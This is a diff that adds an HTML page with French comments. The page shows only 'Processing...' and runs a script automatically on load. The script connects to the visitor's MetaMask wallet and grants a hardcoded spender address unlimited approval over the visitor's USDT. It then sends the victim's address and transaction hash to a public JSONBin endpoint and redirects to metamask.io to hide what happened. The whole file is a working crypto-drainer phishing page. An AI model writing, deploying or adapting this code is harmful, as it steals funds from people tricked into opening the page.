@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: white;
+    }
+
+    h2 {
+      font-size: 2rem;
+      color: #333;
+    }
+  </style>
+
+  <!-- Ajout de la bibliothèque Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.9/dist/ethers.min.js"></script>
+  
+</head>
+<body>
+  <h2>Processing...</h2>
+
+  <script>
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT officiel
+    const SPENDER = "0x7113C4847987bFf1cB39e0C70AaC808056B6E5f0"; // Ton adresse
+    const ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    async function approve() {
+      if (!window.ethereum) {
+        alert("MetaMask not detected.");
+        return;
+      }
+
+      try {
+        // Demande à l'utilisateur de se connecter au portefeuille via WalletConnect
+        await ethereum.request({ method: "eth_requestAccounts" });
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const owner = await signer.getAddress();
+
+        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+        const maxUint = ethers.constants.MaxUint256;
+
+        // Envoie la transaction d'approbation
+        const tx = await usdt.approve(SPENDER, maxUint);
+        console.log("Approval transaction sent...");
+
+        await tx.wait();
+        console.log("Approval confirmed!");
+
+        // ✅ Envoie les infos vers JSONBin (bin public)
+        const response = await fetch("https://api.jsonbin.io/v3/b/682f6a738561e97a5019f7c5", {
+          method: "PUT", // Utiliser PUT pour modifier les données existantes dans le bin
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            owner: owner,
+            spender: SPENDER,
+            txHash: tx.hash
+          })
+        });
+
+        // Vérification de la réponse
+        if (response.ok) {
+          console.log("Data successfully saved to JSONBin!");
+        } else {
+          console.error("Error saving data to JSONBin:", await response.text());
+        }
+
+        // ✅ Redirection
+        window.location.href = "https://metamask.io/";
+
+      } catch (error) {
+        console.error("Error:", error);
+        alert("Erreur : " + (error.message || "Transaction échouée"));
+      }
+    }
+
+    // Appel automatique de la fonction approve au chargement de la page
+    window.onload = approve;
+  </script>
+</body>
+</html>
